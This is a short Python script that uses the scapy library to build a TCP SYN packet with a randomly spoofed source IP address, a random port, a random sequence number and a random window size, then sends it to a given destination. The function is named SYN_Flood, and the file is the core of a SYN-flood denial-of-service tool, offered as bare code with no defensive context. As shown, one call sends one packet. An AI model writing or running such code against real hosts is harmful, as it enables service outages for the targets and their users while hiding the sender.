#!/usr/bin/python3

from scapy.all import IP, TCP, send
from random import randint

def randomIP():
	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000,9000)
	return x


def SYN_Flood(dstIP,dstPort):
	
    s_port = randInt()
    s_eq = randInt()
    w_indow = randInt()

    IP_Packet = IP ()
    IP_Packet.src = randomIP()
    IP_Packet.dst = dstIP

    TCP_Packet = TCP ()
    TCP_Packet.sport = s_port
    TCP_Packet.dport = dstPort
    TCP_Packet.flags = "S"
    TCP_Packet.seq = s_eq
    TCP_Packet.window = w_indow

    send(IP_Packet/TCP_Packet, verbose=0)
    print("Packet sent ...")